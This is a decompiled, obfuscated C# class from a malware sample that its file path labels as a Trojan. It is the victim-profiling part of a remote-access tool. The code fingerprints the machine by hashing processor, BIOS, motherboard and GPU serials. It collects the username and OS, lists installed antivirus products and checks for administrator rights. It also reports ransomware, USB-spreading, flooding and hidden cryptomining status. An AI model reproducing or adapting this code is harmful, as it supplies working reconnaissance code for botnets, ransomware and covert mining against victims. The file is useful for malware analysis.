// Decompiled with JetBrains decompiler
// Type: 成官執望是導.的公的人官導官太命程
// Assembly: 金是人望承子的的是公公的金司的程尊承顧, Version=1.8.7.7, Culture=neutral, PublicKeyToken=null
// MVID: E30F5A4F-F1E8-458D-9542-0A3A79B19682
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-21b86512de83574c3ad44210d025e93fb28d205cfbd18825da0a64a52063b627.exe

using Client.My;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using 金使孫人尊導成繼的金;
using 金席行商她;

namespace 成官執望是導
{
  public class 的公的人官導官太命程
  {
    private static object 生家將繼繼顧公顧的 = (object) 管導行官玉.她尊玉司合命希的顧法人;

    public static object 首執法成太將澤城生是首執的的()
    {
      object obj;
      try
      {
        obj = Operators.ConcatenateObject(Operators.ConcatenateObject(的公的人官導官太命程.首導顧引為玉孫成太接家成繼金(), (object) "_"), (object) 的公的人官導官太命程.將太將金法司子的());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) "Error";
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static object 首導顧引為玉孫成太接家成繼金()
    {
      object obj;
      try
      {
        obj = (object) Environment.UserName;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) "Error";
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static object 導是望管澤生()
    {
      object obj;
      try
      {
        obj = (object) MyProject.Computer.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) "Unkown";
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static object 孫商席使的()
    {
      object obj;
      try
      {
        obj = !Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE").Contains("64") ? (object) "x86" : (object) "x64";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) "*";
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static string 的太的行為為公()
    {
      string str;
      try
      {
        str = new FileInfo(Application.ExecutablePath).LastWriteTime.ToString("dd/MM/yyy");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "Error";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string 將太將金法司子的()
    {
      string str;
      try
      {
        str = 的公的人官導官太命程.執繼成程人法顧的引顧為金(的公的人官導官太命程.尊承命太的澤為("Win32_Processor", "ProcessorId") + "-" + 的公的人官導官太命程.尊承命太的澤為("Win32_BIOS", "SerialNumber") + "-" + 的公的人官導官太命程.尊承命太的澤為("Win32_BaseBoard", "SerialNumber") + "-" + 的公的人官導官太命程.尊承命太的澤為("Win32_VideoController", "Name"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "Error";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    private static string 尊承命太的澤為(string 的接首太城玉席, string 商公顧她的導尊為)
    {
      string str;
      try
      {
        string Left = "";
        ManagementObjectCollection instances = new ManagementClass(的接首太城玉席).GetInstances();
        try
        {
          foreach (ManagementObject managementObject in instances)
          {
            if (Operators.CompareString(Left, "", false) == 0)
            {
              try
              {
                Left = managementObject[商公顧她的導尊為].ToString();
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
          }
        }
        finally
        {
          ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
          objectEnumerator?.Dispose();
        }
        str = Left;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "Error";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string 執繼成程人法顧的引顧為金(string 成執太顧人)
    {
      string str;
      try
      {
        byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(成執太顧人));
        StringBuilder stringBuilder = new StringBuilder();
        int num = checked (hash.Length - 1);
        int index = 10;
        while (index <= num)
        {
          stringBuilder.Append(hash[index].ToString("x2"));
          checked { ++index; }
        }
        str = stringBuilder.ToString().ToUpper();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "Error";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static object 孫是望承太城司家()
    {
      object obj;
      try
      {
        if (Operators.CompareString(命澤成的敬太.導子金人承導敬人行席望人("Rans-Status"), (string) null, false) == 0)
        {
          命澤成的敬太.程金的希尊顧的行顧席司玉家("Rans-Status", "Not encrypted");
          obj = (object) "Not encrypted";
        }
        else
          obj = (object) 命澤成的敬太.導子金人承導敬人行席望人("Rans-Status");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) "Error";
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static object 命玉席受人顧城顧家()
    {
      object obj;
      if (管導行官玉.為程金金公執合引司敬人引行)
      {
        try
        {
          if (Operators.CompareString(命澤成的敬太.導子金人承導敬人行席望人("USB"), (string) null, false) == 0)
          {
            命澤成的敬太.程金的希尊顧的行顧席司玉家("USB", "Not ready");
            obj = (object) 命澤成的敬太.導子金人承導敬人行席望人("USB");
          }
          else
            obj = (object) 命澤成的敬太.導子金人承導敬人行席望人("USB");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          obj = (object) "Error";
          ProjectData.ClearProjectError();
        }
      }
      else
        obj = 管導行官玉.為程金金公執合引司敬人引行 || 管導行官玉.顧望人城顧人顧的命受太敬 ? (object) "Not ready" : (object) "Disabled";
      return obj;
    }

    public static string 執的公尊子席()
    {
      string str;
      try
      {
        string Left = (string) null;
        ManagementObjectCollection objectCollection = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct").Get();
        try
        {
          foreach (ManagementBaseObject managementBaseObject in objectCollection)
            Left = managementBaseObject["displayName"].ToString();
        }
        finally
        {
          ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
          objectEnumerator?.Dispose();
        }
        if (Operators.CompareString(Left, string.Empty, false) == 0)
          Left = "N/A";
        str = Left.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "N/A";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static bool 成顧家的的的受澤()
    {
      bool flag;
      try
      {
        flag = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public static string 公為人管尊首導商引()
    {
      string str;
      try
      {
        if (Process.GetProcessesByName("Regasm").Length > 0)
        {
          try
          {
            ManagementObjectCollection objectCollection = new ManagementObjectSearcher(string.Format("select CommandLine from Win32_Process where Name='{0}'", (object) "Regasm.exe")).Get();
            try
            {
              foreach (ManagementBaseObject managementBaseObject in objectCollection)
              {
                if (managementBaseObject["CommandLine"].ToString().Contains("--donate-level="))
                {
                  str = "Minning...";
                  break;
                }
              }
            }
            finally
            {
              ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
              objectEnumerator?.Dispose();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else
          str = 的公的人官導官太命程.澤顧承的尊澤的太將人的司引();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static object 程商的子子敬顧()
    {
      object obj;
      try
      {
        if (Operators.CompareString(命澤成的敬太.導子金人承導敬人行席望人("Flood"), (string) null, false) == 0)
          命澤成的敬太.程金的希尊顧的行顧席司玉家("Flood", " ");
        obj = (object) 命澤成的敬太.導子金人承導敬人行席望人("Flood");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) "Error";
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static string 澤顧承的尊澤的太將人的司引()
    {
      string str;
      try
      {
        ManagementObject managementObject = new ManagementObject("Win32_Processor.deviceid=\"CPU0\"");
        managementObject.Get();
        str = !managementObject["Name"].ToString().Contains("Intel") ? managementObject["Name"].ToString() : managementObject["Name"].ToString().Replace("(R)", "").Replace("Core(TM)", "").Replace("CPU", "");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "Unknow";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string 太生敬顧太金行家()
    {
      string str1;
      try
      {
        StringBuilder stringBuilder = new StringBuilder();
        string[] directories = Directory.GetDirectories(RuntimeEnvironment.GetRuntimeDirectory().Substring(0, 34));
        int index = 0;
        while (index < directories.Length)
        {
          string str2 = directories[index];
          if (str2.Contains("v4.0"))
            stringBuilder.Append("v4.0");
          else if (str2.Contains("v2.0"))
            stringBuilder.Append("v2.0 ");
          checked { ++index; }
        }
        str1 = stringBuilder.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = "Error";
        ProjectData.ClearProjectError();
      }
      return str1;
    }
  }
}
